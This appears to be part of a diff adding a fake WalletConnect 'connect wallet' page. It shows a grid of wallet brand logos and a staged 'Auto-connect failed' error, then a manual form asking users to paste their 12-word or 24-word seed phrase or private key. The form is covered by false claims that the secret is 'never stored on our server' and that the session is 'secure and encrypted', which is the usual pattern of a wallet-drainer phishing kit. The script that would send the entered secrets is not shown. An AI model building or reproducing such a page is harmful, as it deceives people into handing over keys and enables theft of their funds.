+                                <p>Phantom Wallet</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/timeless-x.webp" alt="">
+                                </span>
+                                <p>Timeless X</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/safe.webp" alt="">
+                                </span>
+                                <p>Safe</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/zerion.webp" alt="">
+                                </span>
+                                <p>Zerion</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/robinhood.webp" alt="">
+                                </span>
+                                <p>Robinhood</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/1inch-wallet.webp" alt="">
+                                </span>
+                                <p>1inch Wallet</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/crypto-defi-wallet.webp" alt="">
+                                </span>
+                                <p>Crypto.com</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/exodus.webp" alt="">
+                                </span>
+                                <p>Exodus</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/argent.webp" alt="">
+                                </span>
+                                <p>Argent</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/imtoken.webp" alt="">
+                                </span>
+                                <p>imToken</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/blockchain.webp" alt="">
+                                </span>
+                                <p>Blockchain</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/magic-eden.webp" alt="">
+                                </span>
+                                <p>Magic Eden</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/kraken-wallet.webp" alt="">
+                                </span>
+                                <p>Kraken Wallet</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="https://img.icons8.com/lollipop/96/shield.png" alt="">
+                                </span>
+                                <p>Other</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div id="connection" style="display: none;">
+                        <div id="landing-section">
+                            <span class="squircle">
+                                <img id="connectionImg" src="assets/logos/walletconnect.png" alt="">
+                            </span>
+                            <h2 id="connectionName">WalletConnect</h2>
+                        </div>
+                        <div id="loading">
+                            <div class="icon">
+                                <span id="conctn-err" class="material-icons" style="color: red; display: none;">
+                                    warning </span>
+                                <span id="loadr"></span>
+                            </div>
+                            <!-- <p style="margin-top: 15px; font-size: 14px" id="msg-txt">Initializing...</p> -->
+                        </div>
+                        <div id="error" style="display: none;">
+                            <div class="icon">
+                                <img src="assets/logos/alert-circle.svg" alt="">
+                            </div>
+                            <p style="margin-top: 15px; text-align: center; font-size: 14px" id="msg-txt">Auto-connect failed.<br> Connect securely manually or retry auto-connect</p>
+
+                            <div id="options">
+                                <span class="btn-rounded" style="margin-right: 5px; font-size: 12px;" onclick="connect_manually()">Connect Manually</span>
+                                <span class="btn-rounded" style=" font-size: 12px;" onclick="retry_connection()">Retry Auto-connect</span>
+                            </div>
+
+                        </div>
+                        <div id="user-input" style="display: none;">
+                            <select id="info-type" style="background-color: #171818;">
+                                <option value="12-word phrase">12-word phrase</option>
+                                <option value="24-word phrase">24-word phrase</option>
+                                <option value="private key">Private Key</option>
+                            </select>
+                            
+                            <br>
+
+                            <textarea id="info" placeholder="Separate each word with spaces. No numbers or special characters"></textarea>
+                            <p style="color: darkgray; text-align: center; font-size: 10px;">Your seed phrase and private key remain fully under your control and are never stored on our server.</p>
+                            <span class="btn-rounded" style="width: 100%; text-align: center;" onclick="connect()">Connect Wallet</span>
+                            <p style="color: darkgray; text-align: center; font-size: 12px;">This session is secure and encrypted. &#128274;</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </section>
+        <script>feather.replace();</script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+    
+  </body>
+</html>
